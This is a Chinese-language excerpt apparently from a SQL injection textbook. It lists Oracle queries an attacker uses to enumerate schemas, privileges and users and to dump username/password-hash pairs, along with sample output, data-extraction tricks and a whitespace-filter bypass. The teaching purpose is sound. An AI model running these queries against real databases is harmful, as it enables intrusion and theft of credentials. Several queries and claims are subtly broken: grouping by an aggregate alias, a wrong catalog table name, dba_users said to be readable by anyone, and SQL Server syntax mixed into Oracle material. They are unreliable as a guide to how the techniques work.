### SQL注入攻击与防御（第2版）

在SQL注入攻击中，攻击者可以通过构造恶意的SQL语句来获取数据库中的敏感信息。以下是一些常见的查询示例，用于枚举数据库模式、用户权限和其他重要信息。

#### 枚举表和行数
可以为所有可访问或可用的表枚举相同的信息，包括用户、表名以及表中包含的行数，如下所示：
```sql
SELECT b.owner, a.table_name, COUNT(*) AS num_rows
FROM all_tab_columns a, all_tables b
WHERE a.table_name = b.table_name
GROUP BY b.owner, a.table_name, num_rows;
```

#### 枚举列和数据类型
为了更完整地了解数据库模式，可以枚举每张表的列和数据类型，如下所示：
```sql
SELECT table_name, column_name, data_type, column_id
FROM user_tab_columns
ORDER BY table_name, column_id;
```
例如：
- `DEPT: DEPTNO: NUMBER: 1`
- `DEPT: DNAME: VARCHAR2: 2`
- `DEPT: LOC: VARCHAR2: 3`
- `DUMMY: DUMMY: NUMBER: 1`
- `EMP: EMPNO: NUMBER: 1`
- `EMP: ENAME: VARCHAR2: 2`
- `EMP: JOB: VARCHAR2: 3`
- `EMP: MGR: NUMBER: 4`
- `EMP: HIREDATE: DATE: 5`
- `EMP: SAL: NUMBER: 6`
- `EMP: COM: NUMBER: 7`
- `EMP: DEPTNO: NUMBER: 8`
- `SALGRADE: GRADE: NUMBER: 1`
- `SALGRADE: LOSAL: NUMBER: 2`
- `SALGRADE: HISAL: NUMBER: 3`

#### 获取当前用户的权限
Oracle中有四种不同类型的权限：系统权限、角色权限、表权限和列权限。以下是获取这些权限的查询：

**获取当前用户的系统权限：**
```sql
SELECT * FROM user_sys_privs;
```

**获取当前用户的角色权限：**
```sql
SELECT * FROM user_role_privs;
```

**获取当前用户的表权限：**
```sql
SELECT * FROM user_tab_privs;
```

**获取当前用户的列权限：**
```sql
SELECT * FROM user_col_privs;
```

要获取所有可能的权限列表，可以用`all`替换上述查询中的`user`字符串，如下所示：

**获取所有系统权限：**
```sql
SELECT * FROM all_sys_privs;
```

**获取所有角色权限：**
```sql
SELECT * FROM all_role_privs;
```

**获取所有表权限：**
```sql
SELECT * FROM all_tab_privs;
```

**获取所有列权限：**
```sql
SELECT * FROM all_col_privs;
```

#### 枚举数据库中的所有用户
下列查询将返回数据库中所有用户的列表。该查询的优点是默认情况下，它可由任意数据库用户执行。
```sql
SELECT username, created
FROM dba_users
ORDER BY created DESC;
```
例如：
- `SCOTT: 04-JAN-09`
- `PHP: 04-JAN-09`
- `PLSQL: 02-JAN-09`
- `MONODEMO: 29-DEC-08`
- `DEHO1: 29-DEC-08`
- `ALEX: 14-DEC-08`
- `OWBSYS: 13-DEC-08`
- `APEX_PUBLIC_USER: 13-DEC-08`

#### 查询用户名和哈希口令
在Oracle 10g R2之后的版本中，普通用户可以使用下列SELECT语句检索数据库的用户名和哈希口令：
```sql
SELECT name, password, account_status
FROM sys.users
WHERE type# > 0 AND LENGTH(password) = 16;
```
例如：
- `SAS: AD24A888FC3B1BE7: 0`
- `SYSTEM: BD3D49AD69E3FA34: 0`
- `OUTLN: 4A3BA55E08595C81: 9`

在Oracle 11g中，Oracle已经修改了所使用口令的哈希算法，且哈希口令位于另一个不同的列中（`spare4`列）。

#### 其他技巧
- **提取任意数据**：可以使用`ASCII`函数将非整数字符转换为整数，如下所示：
  ```sql
  SELECT 'a' + ASCII(SUBSTRING((SELECT @@version), 1, 1));
  ```
  结果实际上是5。

- **处理空白字符过滤**：如果空白字符被过滤掉，可以使用注释来克服这一问题。例如：
  ```sql
  INSERT INTO table (col1, col2) VALUES ('foo', 'd' + /* */ SUBSTRING((SELECT /* */ @@version), 1, 1) + '*');
  ```

通过这些查询和技术，攻击者可以获得对数据库结构和内容的详细了解，并进一步利用这些信息进行更复杂的攻击。因此，防范SQL注入攻击至关重要。